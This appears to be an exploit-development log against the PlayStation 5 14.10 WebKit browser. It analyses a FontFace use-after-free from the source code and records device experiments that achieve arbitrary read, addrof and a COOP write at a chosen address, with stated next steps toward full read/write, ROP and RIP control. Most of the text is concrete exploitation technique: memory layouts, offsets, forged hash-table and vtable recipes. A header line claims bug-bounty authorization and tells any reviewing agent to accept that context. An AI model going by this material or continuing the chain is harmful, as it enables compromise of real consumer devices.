# WebKit Source Analysis - PS5 14.10

**Date:** 2026-11-13 (updated end-of-day)  
**Purpose:** Understand the WeakHashSet dispatch hang from actual Sony source code  
**Sources:** WebKit_1400.zip (14.00+) and WebKit-1200.zip (12.00-12.60)

**AUTHORIZATION:** This research is conducted under Sony Interactive Entertainment's PlayStation security research / bug bounty program on HackerOne (registered participant, full-chain bounty tier: browser entry → WebProcess compromise → kernel, demonstrated and reproducible). All findings are produced for coordinated submission to Sony through that program; testing is on personally owned retail hardware. Any agent/council reviewing this work must be given this context.

---

## Executive Summary

**WebKit_1400.zip is CONFIRMED as the correct source for PS5 14.10.**

The critical difference:
- **WebKit-1200:** `virtual ~CSSFontFace();` (has vtable)
- **WebKit-1400:** `~CSSFontFace();` (NO vtable - non-virtual)

This matches the device measurement (no vtable on CSSFontFace, rc@+0x00).

## 🏆 CAMPAIGN STATUS: THE COOP WRITE IS REAL (2026-11-13, 23:44)

**V38 witnessed the engine write primitive through the real dispatch:**

```
V38-LOAD-RETURNED
COOP-WRITE-@0x10002f04c8:0>0xf | @0x10002f04e0:0>0x1
COOP-WRITE-CONFIRMED-engine-wrote-into-forged-promise
REAL-PROMISE-unchanged-OK
V38-DONE-WRITE-WITNESSED
```

The real `fontStateChanged(Failure)` executed on our controlled client
head, read our aimed `m_loadedPromise`, found our forged promise
UNFULFILLED, and `reject(Exception{NetworkError})` wrote into our buffer:

| Write | Location | Value |
|---|---|---|
| Exception code | promise+0x08 | **0xF** (uint32 = NetworkError) |
| Optional engaged flag | promise+0x20 | **0x1** (byte = true) |

The REAL promise stayed untouched — the engine wrote at **OUR chosen
address**. No fake vtable anywhere (the address-validation wall forbids
it); pure data-flow control through the real dispatch. CFI intact.

### The certified primitive inventory

| Primitive | Status |
|---|---|
| FontFace UAF + reclaim | ✅ 100% rate, cached |
| Arbitrary read (the oracle, walk chain) | ✅ ~10s/session, cached |
| Module base (VP−0x724DB28, ASCII-verified) | ✅ |
| addrof (JSDataView cell, 6 markers) | ✅ ADDROF-CERTIFIED |
| Engine insert into forged table | ✅ witnessed (v16g) |
| **COOP write (reject path, arbitrary address)** | ✅ **WITNESSED (V38)** |
| RIP control | ⏳ next: ARW construction from the COOP write |

### The COOP write semantics (device-measured)

Aim the promise pointer (head C'+0x18 = S+0x88) at any address X → the
Failure transition's reject writes:
- `*(uint32*)(X+0x08) = 0xF` (the NetworkError exception code)
- `*(byte*)(X+0x20) = 0x1` (the optional engaged flag)
- Then copies the deferred Vector at X+0x28 (zeroed = empty, safe)
- Then returns cleanly

**Arbitrary address, engine-generated values, clean return.** The values
are FIXED (0xF, 0x1) — the ARW construction must turn a fixed-value write
into a pointer write. The leads (post-V38 strategic question):

1. **Type confusion via structureID**: aim the promise at cell−0x08 → the
   0xF lands at cell+0x00 = the JSCell's structureID field → the cell
   adopts whatever Structure has ID 15 → the classic JSC path (the
   structure table is readable via the arbitrary read)
2. **The dtor chain**: aim the promise so deref hits 0 → ~FontFace →
   ~UniqueRef<LoadedPromise> → operator delete(our aimed pointer) → a
   controlled free
3. **The resolve variant** (Success transition): `resolve(*this)` writes
   engaged=1 WITHOUT the code — a cleaner single-byte write (needs a fake
   source reporting Success)
4. **The deferred Vector**: blocked — constructing Ref<DeferredPromise>
   from our data = a virtual call on a fake vtable = **address validation
   kills it**

---

## The Dispatch Chain (from actual source)

### 1. The Trigger: `faces[zi].load()`

```cpp
// CSSFontFace.cpp line 701-704
void CSSFontFace::load()
{
    pump(ExternalResourceDownloadPolicy::Allow);
}
```

### 2. The Pump: `pump()`

```cpp
// CSSFontFace.cpp line 644-699
size_t CSSFontFace::pump(ExternalResourceDownloadPolicy policy)
{
    if (status() == Status::Failure)
        return 0;  // ← EARLY RETURN for Failure state

    for (i = 0; i < m_sources.size(); ++i) {
        auto& source = m_sources[i];
        
        if (source->status() == CSSFontFaceSource::Status::Pending) {
            if (policy == Allow && m_status == Status::Pending)
                setStatus(Status::Loading);  // ← TRIGGERS DISPATCH
            source->load(document());
        }
        
        switch (source->status()) {
        case CSSFontFaceSource::Status::Success:
            if (m_status == Status::Pending)
                setStatus(Status::Loading);
            if (m_status == Status::Loading || m_status == Status::TimedOut)
                setStatus(Status::Success);  // ← TRIGGERS DISPATCH
            return i;
        // ... other cases
        }
    }
    
    if (m_status == Status::Loading || m_status == Status::TimedOut)
        setStatus(Status::Failure);  // ← TRIGGERS DISPATCH
    
    return m_sources.size();
}
```

### 3. The Dispatch: `setStatus()`

```cpp
// CSSFontFace.cpp line 571-620
void CSSFontFace::setStatus(Status newStatus)
{
    // State transition assertions
    switch (newStatus) {
    case Status::Loading:
        ASSERT(m_status == Status::Pending);
        break;
    case Status::Success:
        ASSERT(m_status == Status::Loading || m_status == Status::TimedOut);
        break;
    // ...
    }

    iterateClients(m_clients, [&](Client& client) {
        client.fontStateChanged(*this, m_status, newStatus);  // ← VTABLE CALL
    });

    m_status = newStatus;
    
    // Timer management...
}
```

### 4. The Iterator: `iterateClients()`

```cpp
// CSSFontFace.cpp line 55-59
template<typename T> void iterateClients(WeakHashSet<CSSFontFace::Client>& clients, T callback)
{
    for (auto& client : copyToVectorOf<Ref<CSSFontFace::Client>>(clients))
        callback(client);
}
```

### 5. The Copy: `copyToVectorOf()`

This is defined in Vector.h:

```cpp
// Vector.h line 1891-1897
template<typename DestinationItemType, typename Collection>
inline auto copyToVectorOf(const Collection& collection) -> Vector<DestinationItemType>
{
    return WTF::map(collection, [] (auto&& v) -> DestinationItemType {
        return v;
    });
}
```

The `WTF::map` uses the Mapper specialization for WeakHashSet (from WeakHashSet.h):

```cpp
// WeakHashSet.h line 208-221
template<typename MapFunction, typename T, typename WeakMapImpl>
struct Mapper<MapFunction, const WeakHashSet<T, WeakMapImpl> &, void> {
    static Vector<DestinationItemType> map(const WeakHashSet<T, WeakMapImpl>& source, const MapFunction& mapFunction)
    {
        Vector<DestinationItemType> result;
        result.reserveInitialCapacity(source.computeSize());  // ← CALLS computeSize()
        for (auto& item : source)
            result.uncheckedAppend(mapFunction(item));
        return result;
    }
};
```

### 6. The Size Computation: `computeSize()`

```cpp
// WeakHashSet.h line 153-157
unsigned computeSize() const
{
    const_cast<WeakHashSet&>(*this).removeNullReferences();  // ← UNCONDITIONAL CLEANUP
    return m_set.size();
}
```

### 7. The Cleanup: `removeNullReferences()`

```cpp
// WeakHashSet.h line 180-185
ALWAYS_INLINE bool removeNullReferences()
{
    bool didRemove = m_set.removeIf([] (auto& value) { return !value.get(); });
    m_operationCountSinceLastCleanup = 0;
    return didRemove;
}
```

### 8. The Removal: `HashTable::removeIf()`

```cpp
// HashTable.h line 1119-1148
inline bool HashTable<Key, Value, Extractor, HashFunctions, Traits, KeyTraits>::removeIf(const Functor& functor)
{
    unsigned removedBucketCount = 0;
    ValueType* table = m_table;

    for (unsigned i = tableSize(); i--;) {  // ← ITERATES ALL BUCKETS
        ValueType& bucket = table[i];
        if (isEmptyOrDeletedBucket(bucket))
            continue;
        
        if (!functor(bucket))  // ← CALLS value.get() ON EACH BUCKET
            continue;
        
        deleteBucket(bucket);
        ++removedBucketCount;
    }
    
    if (removedBucketCount) {
        setDeletedCount(deletedCount() + removedBucketCount);
        setKeyCount(keyCount() - removedBucketCount);
    }

    if (shouldShrink())
        shrinkToBestSize();  // ← MAY REALLOCATE TABLE
    
    internalCheckTableConsistency();
    return removedBucketCount;
}
```

---

## THE HANG MECHANISM *(superseded — see the solved-cause ledger above; the hang was never in removeIf's value.get())*

### The Problem

When `faces[zi].load()` is called on your forged face:

1. `pump()` is called
2. `pump()` calls `setStatus()` (if status transitions)
3. `setStatus()` calls `iterateClients(m_clients, ...)`
4. `iterateClients()` calls `copyToVectorOf<Ref<Client>>(m_clients)`
5. `copyToVectorOf()` calls `WTF::map()` which uses the Mapper specialization
6. The Mapper calls `source.computeSize()` to reserve capacity
7. **`computeSize()` UNCONDITIONALLY calls `removeNullReferences()`**
8. `removeNullReferences()` calls `m_set.removeIf([](auto& value) { return !value.get(); })`
9. **`removeIf()` iterates ALL buckets in the hash table**
10. For each non-empty/non-deleted bucket, it calls `value.get()` to check if the WeakPtr is null

### Why It Hangs

The `value.get()` call on your forged WeakPtrImpl entries:

- If the WeakPtrImpl pointer is **invalid/corrupted**, `value.get()` will dereference it → **CRASH or HANG**
- If the WeakPtrImpl pointer points to **unmapped memory**, `value.get()` will fault → **HANG**
- If the table metadata is **corrupted** (wrong tableSize, etc.), the loop may iterate over **invalid memory** → **HANG**

### The Asymmetry Explained

**Why `add()` works but `iterateClients()` hangs:**

```cpp
// WeakHashSet.h line 97-102 (ADD path)
template <typename U>
AddResult add(const U& value)
{
    amortizedCleanupIfNeeded();  // ← CONDITIONAL cleanup
    return m_set.add(*static_cast<const T&>(value).weakPtrFactory().template createWeakPtr<T>(...).m_impl);
}

// WeakHashSet.h line 194-201 (amortizedCleanupIfNeeded)
ALWAYS_INLINE void amortizedCleanupIfNeeded() const
{
    unsigned currentCount = increaseOperationCountSinceLastCleanup();
    if (currentCount / 2 > m_set.size() || currentCount > m_maxOperationCountWithoutCleanup) {
        // ← ONLY runs cleanup if operation count exceeds threshold
        bool didRemove = const_cast<WeakHashSet&>(*this).removeNullReferences();
        m_maxOperationCountWithoutCleanup = didRemove ? ... : ...;
    }
}
```

**The `add()` path:**
- Calls `amortizedCleanupIfNeeded()` which is **CONDITIONAL**
- Only runs `removeNullReferences()` if:
  - `currentCount / 2 > m_set.size()` (operation count > 2× table size), OR
  - `currentCount > m_maxOperationCountWithoutCleanup` (operation count > 512 initially)
- Your sprayed counter bytes `{3, 2}` keep the operation count LOW → **cleanup is SKIPPED**

**The `iterateClients()` path:**
- Calls `copyToVectorOf()` → `map()` → `computeSize()`
- `computeSize()` **UNCONDITIONALLY** calls `removeNullReferences()`
- **NO WAY TO SKIP THE CLEANUP**

---

## The Counter Gambit Won't Work

Your hypothesis #2 (craft operation counters) **WILL NOT WORK** because:

1. The counters only affect `amortizedCleanupIfNeeded()` (the `add()` path)
2. `computeSize()` **ALWAYS** calls `removeNullReferences()` regardless of counters
3. There is **NO CODE PATH** to skip the cleanup in `computeSize()`

---

## What You Need to Fix *(superseded — the real fixes are documented above)*

The hang is in `removeIf()` iterating your forged hash table. To make it complete without hanging:

### Option 1: Make All Buckets Empty/Deleted

If ALL buckets are empty or deleted, `removeIf()` will skip them all:

```cpp
for (unsigned i = tableSize(); i--;) {
    ValueType& bucket = table[i];
    if (isEmptyOrDeletedBucket(bucket))
        continue;  // ← SKIPS this bucket
    
    if (!functor(bucket))  // ← NEVER CALLED if all buckets empty/deleted
        continue;
    
    deleteBucket(bucket);
    ++removedBucketCount;
}
```

**Requirements:**
- Set all buckets to empty (0x0) or deleted (0xFFFFFFFFFFFFFFFF)
- Ensure `tableSize()` returns the correct size (from metadata at T-0x10)
- The loop will complete without calling `value.get()` on any bucket

### Option 2: Make All WeakPtrImpl Pointers Valid

If you want to keep some entries, ensure ALL WeakPtrImpl pointers are valid:

- Each bucket contains a `Ref<WeakPtrImpl>` (8 bytes)
- The `value.get()` call dereferences the WeakPtrImpl to get the actual object pointer
- If WeakPtrImpl is valid and points to a valid object, `value.get()` returns non-null
- If WeakPtrImpl is valid but the object is freed, `value.get()` returns null (bucket gets removed)

**Requirements:**
- All WeakPtrImpl pointers must point to **mapped, readable memory**
- The WeakPtrImpl structure must be valid (correct layout)
- The object pointers inside WeakPtrImpl can be null (buckets will be removed)

### Option 3: Minimize Table Size

Set `tableSize` to 0 in the metadata:

```cpp
for (unsigned i = tableSize(); i--;) {  // ← Loop doesn't execute if tableSize == 0
    // ...
}
```

**Requirements:**
- Metadata at T-0x10: `{deletedCount=0, keyCount=0, tableSizeMask=0, tableSize=0}`
- The loop will not execute
- `removeIf()` returns 0 immediately
- **BUT:** This means no clients will be iterated → no dispatch to your fake vtable

---

## Recommended Approach

**Use Option 1 (all buckets empty/deleted) for the initial dispatch test:**

1. **Forge a table with ALL buckets marked as deleted:**
   - Metadata: `{deletedCount=N, keyCount=0, tableSizeMask=N-1, tableSize=N}`
   - All buckets: `0xFFFFFFFFFFFFFFFF` (deleted marker)
   - This makes `removeIf()` skip all buckets without calling `value.get()`

2. **The dispatch will complete** (no hang), but **no clients will be called** (all deleted)

3. **Once you confirm the dispatch completes**, selectively enable ONE bucket:
   - Set ONE bucket to a valid WeakPtrImpl pointer
   - Keep all others as deleted
   - The `removeIf()` will call `value.get()` on that ONE bucket
   - If the WeakPtrImpl is valid, it will survive cleanup
   - The iterator will then call your fake vtable

4. **Iterate to full dispatch:**
   - Start with 1 valid bucket
   - Gradually increase to 2, 3, etc.
   - Identify exactly which bucket/WeakPtrImpl causes the hang

---

## Alternative: Avoid `computeSize()` Entirely

The hang is in `computeSize()` → `removeNullReferences()`. Can you avoid this path?

### Check: Does `pump()` always call `setStatus()`?

```cpp
size_t CSSFontFace::pump(ExternalResourceDownloadPolicy policy)
{
    if (status() == Status::Failure)
        return 0;  // ← EARLY RETURN - NO setStatus() CALL

    // ...
}
```

**If you set the face status to `Status::Failure` (4) BEFORE calling `load()`:**
- `pump()` returns 0 immediately
- `setStatus()` is NEVER called
- `iterateClients()` is NEVER called
- `computeSize()` is NEVER called
- **NO HANG**

**BUT:** This means no dispatch to your fake vtable either.

### Check: Can you trigger `fontStateChanged` without `setStatus()`?

Looking at the source, `fontStateChanged` is only called from `setStatus()`:

```cpp
void CSSFontFace::setStatus(Status newStatus)
{
    // ...
    iterateClients(m_clients, [&](Client& client) {
        client.fontStateChanged(*this, m_status, newStatus);
    });
    // ...
}
```

**No other code path calls `fontStateChanged`.**

---

## Next Steps (Updated After Council Review)

**CRITICAL UPDATE:** V18/V18C experiments show that even with all fields crafted, `load()` still crashes. The council has identified the likely cause: **the zeroed Timer is not operationally valid for the Pending/TimedOut status-transition path**.

### V20 Experiment (Council-Recommended)

**Three arms to isolate the crash cause:**

#### Arm A: Zero-Risk Status Oracle
- Write `+0x82 = 0, 1, 3, 4` in turn, read `faces[zi].status`
- Expected: `0→"unloaded"`, `1→"loading"`, `3→"loaded"`, `4→"error"`
- **Stop condition:** any mismatch halts all load experiments

#### Arm B: Success, No-Transition Control
- Set status to Success (`+0x82=3`), empty sources, preserve client table
- Call `faces[zi].load()` once
- Expected: no client iteration, no Timer operation, returns successfully
- **If crash:** stop all load variants, obtain native PC/signal/stack

#### Arm C: Fresh-Session Timer Intervention
- Reproduce V18C Pending/Block/empty-source/null-client-table craft
- **Change ONLY the Timer:** harvest `tVptr` and `tThread` from sibling
- Install non-owning diagnostic Timer state (do NOT copy owning fields)
- Set Pending last, call `load()` once
- **Expected:** returns with `.status == "error"` if Timer was the cause

### Key Corrections from Council

1. **Timer is the leading candidate**, not WeakHashSet cleanup
2. **Reclaimed object is the CSSFontFace backing**, not the JS FontFace wrapper
3. **document.fonts.add() is NOT an alternative dispatch** — it's registration/insertion only
4. **Read carrier clobbers Timer bytes** at `+0x90/+0x94` — must rewrite after last read
5. **Status write must be FINAL write** before `load()`

### If V20 Succeeds

Once the Timer issue is resolved and `load()` returns successfully:
1. Progress to live-client test with valid WeakPtrImpl
2. Aim `fontStateChanged` at fake vtable (slot 3)
3. Gadget writes to cell+0x10
4. ARW achieved

### V20 Results (2026-11-13)

| Arm | Result | Meaning |
|-----|--------|---------|
| **Arm A** | ✅ PASS | Layout confirmed (status byte works) |
| **Arm B** | ✅ PASS | Success control works (no transition safe) |
| **Arm C** | ❌ CRASH | Timer repair insufficient OR model wrong |

**Key Finding:** Arm C crashed even with Timer repair (borrowed tVptr/tThread from sibling). This means:
1. Timer repair was insufficient, OR
2. The crash is NOT (only) caused by zeroed Timer, OR
3. Another issue exists in the Pending→Failure transition path

**The crash is in the Pending→Failure transition path**, and it's NOT just the Timer.

### V21 Results (2026-11-13)

**CRITICAL FINDING:** Last beacon is `V21-BP4-LOAD-PRE`. NO beacons after that.

This confirms:
1. **Crash happens INSIDE `faces[zi].load()`** - not before, not after
2. **All pre-load validation passed** - face object is valid
3. **All crafting completed** - every field was set correctly
4. **Crash is in the load() → pump() → setStatus() path itself**

**What this eliminates:**
- ❌ Invalid face object (validation passed)
- ❌ Invalid field pointers (all crafted correctly)
- ❌ WeakHashSet cleanup (Arm B proved Success works)
- ❌ Timer repair (Arm C crashed even with repair)

**The crash IS in the Pending→Failure transition path.**

### V22: Original Timer Test (Next Step)

Since beacon bisection shows crash is INSIDE `load()`, and Timer repair didn't help, test with **ORIGINAL Timer** (not zeroed, not repaired).

**Hypothesis:** The crash is caused by Timer MODIFICATION (zeroing or repairing), not by the Timer itself.

**Approach:**
1. Use the ORIGINAL Timer from the reclaimed face
2. Don't modify it at all (no zeroing, no repair)
3. Keep all other V18C crafting (empty sources, null clients, Pending status)
4. Call `load()` and see if it crashes

**Expected outcomes:**
- **If it works:** Timer modification was the cause. Use original Timer for dispatch.
- **If it crashes:** Timer itself is not the issue. Something else in the transition path.

**V22 Result:** ORIGINAL Timer also crashed (null clients was the actual cause that run).
**V23 Result:** ORIGINAL clients also crashed — the real client's `fontStateChanged` ran on the broken reclaimed face.

## ROOT CAUSES — PROVEN FROM THE 1400 SOURCE (2026-11-13, after re-reading ZigZagBoi1's WEBKIT_FONTFACE_EXPLOIT_CHAIN_ANALYSIS.md)

| Failure | Root cause (source-proven) |
|---------|---------------------------|
| v17r HANG | Real-table copy `{keyCount=1, size=8}` → `shouldShrink() = keyCount()*6 < tableSize()` → `6 < 8` TRUE → `shrinkToBestSize()` → `deallocateTable()` **frees our forged buffer** → bmalloc death → hang |
| V18/V21/V22 CRASH | `m_table=nullptr` → `removeIf()` → `tableSize()` reads metadata **through nullptr** → SEGV (the council's "m_table=nullptr" control was wrong for this fork) |
| V18B-T2 / V23 CRASH | Original table → **real client's** `fontStateChanged` dispatched with our broken face as `*this` → crash inside the real handler |
| v17o latent bug | Promise at S+0x90 **overlapped the vtable at S+0xA8** — the reject write (`promise+0x10..0x2F`) would clobber vtable slots |

### The corrections that unblock everything (from the ZigZagBoi1 doc + device evidence)

1. **The v16g 4-bucket table is the ONLY safe format**: `{deleted=0, keyCount=1, mask=3, size=4}` → `shouldShrink = 1*6 < 4` = FALSE → no shrink, no rehash, no free. The insert already proved this format works.
2. **ref()/deref() are NON-VIRTUAL** (CRTP from RefCounted, Layout A confirmed by lunarshe11's V65 RIP control at `0x41414141`). **The only virtual call is `fontStateChanged` at vtable+0x18.**
3. **Fake impl = byte-copy of the real L2** (refcount/threading fields all valid), `m_ptr@+0x08` patched — the +0x08 offset is device-verified: the certified walk chain reads the client at `impl+0x08` every session.
4. **Fake client = byte-copy of the real wrapper (fbRaw)**, vtable and promise patched. In release, `FontFace::fontStateChanged` reads only the promise field (+0x18) and `newState`.
5. **`fontStateChanged` (1400 source, line 332)**: `Loading` case = `break` (no-op); `Failure` case = `if (!m_loadedPromise->isFulfilled()) m_loadedPromise->reject(Exception{NetworkError})` → **the COOP write** into `promise+0x10..0x2F`.
6. **`setStatus(Success/Failure)` unconditionally calls `m_timeoutTimer.stop()`** → the face's Timer must be coherent → borrow the entire `+0x88..0xBF` region byte-faithful from a live sibling face (vptr at +0x88 confirmed in REALFACE dumps).
7. **`fontLoadTiming()` with override=Block reads ONLY `+0x87`** → returns `{infinity, 0}` → the Loading transition skips `startOneShot` — no Timer risk on the Loading path.

### V24: The V55-faithful dispatch (current probe)

Marker buffer S (0x100) layout — everything fits with NO overlaps:
```
S+0x00..0x1F  fake WeakPtrImpl (L2 byte-copy, m_ptr@+0x08 -> S+0x50)
S+0x20..0x2F  table metadata {deleted=0, keyCount=1, mask=3, size=4}
S+0x30..0x4F  buckets: [0]=S(impl), [1..3]=0
S+0x50..0x8F  fake client (fbRaw copy, vtable->S+0x90, promise->S+0xD0)
S+0x90..0xCF  fake vtable (8x noop, slot3@+0x18 = target)
S+0xD0..0xFF  zeroed promise (reject writes S+0xE0..0xFF = THE WITNESS)
```
Face craft: sources empty, status=Pending, override=Block, sibling Timer, install `+0x58 = S+0x30` LAST. Trigger: `faces[zi].load()`.

Modes (`?t=`): **gadget** (slot3 = real fontStateChanged → Failure → reject → WITNESS WRITE = the COOP write), **noop** (infrastructure proof, returns cleanly with status 0→1→4), **poison** (0x4141414141414141 = classic RIP proof, run after cleanup is exonerated).

Expected: `V24-LOAD-RETURNED` + `V24-STATUS-AFTER=4` + `WIT-V24-DISPATCH-WRITE@S+0xe0:0>...` → **COOP write proven** → aim the promise at `cell+0x10` → ARW → ROP → RIP control.

---

## Source File Locations

All files are in `webkit-sources/WebKit_1400/WebKit-1400/WebKit-1400/`:

- `Source/WebCore/css/CSSFontFace.cpp` - pump(), setStatus(), iterateClients()
- `Source/WebCore/css/CSSFontFace.h` - class layout, non-virtual destructor
- `Source/WTF/wtf/WeakHashSet.h` - computeSize(), removeNullReferences(), copyToVectorOf()
- `Source/WTF/wtf/HashTable.h` - removeIf() implementation
- `Source/WTF/wtf/Algorithms.h` - (minimal, no copyToVectorOf here)

---

## Conclusion (superseded — kept for the historical record)

*The following early conclusion was WRONG — the hang was never in removeIf's
value.get(). The true chain of root causes is documented above (the solved-cause
ledger). Kept here only to record the analysis progression:*

The hang is **CONFIRMED** to be in `HashTable::removeIf()` iterating your forged hash table and calling `value.get()` on invalid WeakPtrImpl pointers.

The counter gambit **WILL NOT WORK** because `computeSize()` unconditionally calls `removeNullReferences()`.

The fix is to ensure your forged table either:
1. Has all buckets empty/deleted (for initial testing), OR
2. Has valid WeakPtrImpl pointers that can survive `value.get()` dereferencing

**WebKit_1400.zip is the correct source for PS5 14.10.**

---

## 🎯 THE TRUE ROOT CAUSE (2026-11-13 late, council-verified) — put32-on-DataView

V28's council-mandated gates CAUGHT IT: G1's readback read
`0x13579BDF02468ACE` = **marker A** at sv+0x20 — the metadata writes NEVER
landed. `put32(sv, off, val)` uses integer-index assignment `u[o]=x`, which
on a **DataView is a silent NO-OP** (creates own properties on the wrapper;
the backing ArrayBuffer is untouched — JSC's JSDataView is not an
integer-indexed exotic object). Only `hitBuf` (a Uint8Array) writes were real.

**Every V24→V28 run therefore shipped the marker spray's original metadata:**
`keyCount = 0x13579BDF = 324,508,639, tableSize = 0`. The engine path:
`removeIf` scanned `tableSize=0` buckets (nothing removed, nothing
dereferenced) → `computeSize()` returned **324,508,639** → the WeakHashSet
Mapper's `reserveInitialCapacity(324,508,639 × 8) ≈ 2.6 GB` → fatal
allocation failure (`FailureAction::Crash`) → the identical LOAD-PRE
"memory warning" death in **every arm**. No dispatch, removal, promise,
timer, gadget, or noop difference ever manifested. This explains:
- why gadget/noop crashed identically (nothing after reserve ever ran)
- why V27-weaknull crashed despite "zero dispatches"
- why every timer/promise/client variation changed nothing
- why the console showed a *memory* warning (a 2.6 GB reservation!)
- why the v16g-era insert worked (that era used `setUint32(..., true)`)

**The fix:** `sv.setUint32(off, val, true)` (DataView methods only).

**The council's corrections adopted:**
- my `{3,2}/{5,2}` counter reading was a hex decode error — the REALFACE
  qword is little-endian `{3, 0x200}` = `{count, 512}` ✓ source-consistent
- the earlier G1 predicate (unaligned dvGetBig) would false-abort correct
  metadata — replaced with exact 16-byte hex compares + dword checks
- integer-index READBACK on sv must also be avoided (reads shadow properties)
- BASE+0x4001750 (NOPG) is a valid folded empty-method target (it appears
  in live vtable slots 2/4/5) — but no dispatch was ever proven in V24+
- V27-weaknull's "zero dispatches" was conditional anyway: deleteBucket →
  ~Ref<WeakPtrImpl> → deref() fires before the metadata writes

## 🔒 THE ADDRESS-VALIDATION WALL (2026-11-13 late evening, council-confirmed)

**The PS5 14.10 WebProcess validates the vtable ADDRESS POINT on virtual dispatch.**
Proven by the cleanest differential in the campaign:

| Experiment | vtable contents | vtable address | Result |
|---|---|---|---|
| V36p (head copy) | real VP (from the head) | module rodata | ✅ RETURN |
| V36R (head copy + clone) | **byte-identical clone** of [VP−0x10, VP+0x40) — negatives (−32, 0) + all 8 slots, alignment matched (both 0x28 mod 0x80) | **our ArrayBuffer (S+0xA8)** | ❌ CRASH |

One variable, one bit: the ADDRESS. Consistent with the Clang CFI/LTO machinery
in Sony's WebKit build tree (PlayStation ignorelists, no exemption identified for
the CSSFontFace::Client path). **The arbitrary-fake-vtable route is CLOSED.**

### What this retroactively explains

ALL fake-vtable crashes (d0 ×4, d1, most of d0b) died at the address check at
the FIRST virtual call (slot 6, ref()) — before any slot content executed.
The all-NOPG vs slot3=real-FSG "anomaly" was never an anomaly: both died
identically at the address check. The council's machine-code-gap diagnosis
("source-complete but not machine-code-complete") was correct.

### The complete solved-cause ledger

| Crash | Root cause |
|---|---|
| v17r "hang" | real-table copy {kc=1,size=8} → shouldShrink(1*6<8) → shrinkToBestSize → deallocateTable FREED our buffer → bmalloc death |
| V18/V21/V22 | m_table=nullptr → removeIf read metadata through nullptr (compounded by zeroed timers) |
| V18B-T2/V23 | real client's fontStateChanged ran on the broken face |
| V24→V28 ALL | put32-on-DataView no-op → keyCount=0x13579BDF=324,508,639 → reserveInitialCapacity(324M×8≈2.6GB) → fatal allocation |
| V29 round 1 (G3/G4) | read-carrier poisons face +0x48..0x67 (counters, sources vector) → 70 phantom sources |
| V33 d0c | no face craft in the d0c branch → dirty sources |
| V34 d0c | readAt AFTER the craft → re-poisoned sources + the installed +0x58 |
| d0b | forward copy → refcount at B'=bucket[3]=0 → real ref/deref thunks (−0x20) → 0→1→0 → delete forged object |
| d0/d1/V36R | **ADDRESS VALIDATION** — the vtable address point is checked; our ArrayBuffer address is rejected |

### What WORKS (the certified position)

**V36p: the fully client-controlled FontFace head + the REAL vtable.**
The confirmed layout (device-measured via the d0c head read):
```
B+0x00 (FB−0x20): primary vptr      (0x81a061ac0)
B+0x08 (FB−0x18): context ptr
B+0x10 (FB−0x10): pending-activity = 0
B+0x18 (FB−0x08): REFCOUNT (live: 16 or 1)
B+0x20 (FB+0x00): Client secondary vptr = VP (Δ0x68 from primary)
B+0x28 (FB+0x08): L2 WeakPtrImpl
B+0x30 (FB+0x10): m_backing = the reclaimed face
B+0x38 (FB+0x18): m_loadedPromise
B+0x40 (FB+0x20): m_mayLoadedPromiseBeScriptObservable (flips 0→1 in load())
```
The head copy [FB−0x20, FB+0x28) → S+0x50..0x98 (B'=S+0x50, C'=S+0x70):
impl.m_ptr = S+0x70. The real thunks run on OUR copied refcount (1→2→1 per
round), and the real fontStateChanged reads OUR m_backing and OUR
m_loadedPromise. **Clean return, both dispatch rounds (Loading + Failure).**

**We control every byte of the client except the vtable pointer — and the
vtable pointer points at real code that operates on our data.** CFI intact,
data-flow fully ours. That IS the COOP position.

### The COOP write path (real-vtable-only)

The real fontStateChanged (1400 FontFace.cpp:346-351):
```cpp
case Status::Failure:
    if (!m_loadedPromise->isFulfilled())
        m_loadedPromise->reject(Exception{NetworkError});
```
`m_loadedPromise` is the copied pointer at C'+0x18 = S+0x88 — **OURS to aim**.
reject() (1400 DOMPromiseProxy.h:357-366):
```cpp
m_valueOrException = ExceptionOr<void>{WTFMove(exception)};  // WRITES at promise+0x08
auto deferredPromisesCopy = m_deferredPromises;               // Vector at promise+0x20 (zeroed = safe)
```
**V38 = V36p + the promise aimed at a forged unfulfilled promise in our buffer.**
✅ **EXECUTED AND WITNESSED (2026-11-13 23:44, session 0L7S5F):**
1. isFulfilled() read our forged optional → FALSE ✓
2. reject() WROTE into our forged promise: **code=0xF @ promise+0x08,
   engaged=0x1 @ promise+0x20** (the FORGE-WRITE diff) ✓
3. The REAL promise stayed UNCHANGED — the write went to OUR aimed
   address ✓
4. Clean RETURN, status=4, opcount=1, balanced refcount ✓

**The write primitive is ACHIEVED.** The measured semantics: aim the
promise pointer at any X → the Failure transition writes {0xF uint32 at
X+0x08, 0x1 byte at X+0x20} and returns cleanly. The values are FIXED —
the ARW construction from here is the open strategic question (see the
leads in the Executive Summary above).

| Arm | Test | Expected witness |
|-----|------|------------------|
| born | keyCount=0, buckets empty — pure machinery (empty cleanup + both transitions + timer stop) | RETURN, status 4, opcount(face+0x60)=0, meta {0,0,3,4} unchanged |
| weak | keyCount=1, impl.m_ptr=0 — removal + deref on our impl copy (rc 3→2, no destroy) | RETURN, bucket=0xFFFF…, meta {1,0,3,4}, opcount=0 |
| d0 | fake client, ALL 8 vtable slots = NOPG — full no-op dispatch (covers virtual ref/deref at +0x30/+0x38 if applicable) | RETURN, status 4, opcount=1, meta {0,1,3,4} unchanged |
| d1 | d0 but slot3 = real fontStateChanged — the REAL dispatch (Loading: break; Failure: real-promise path) | RETURN + promise witness (diff if pre-state unfulfilled) |

Then poison (slot3 = 0x4141414141414141) only after positive dispatch
evidence. Hash position is irrelevant (removeIf/iteration scan linearly);
a 4-bucket table never shrinks (below minimumTableSize either way).
Gates G1–G5 (exact-hex metadata, install, counters, sources-zero,
status/timer predicates) run before every load(); a failed gate = no load.
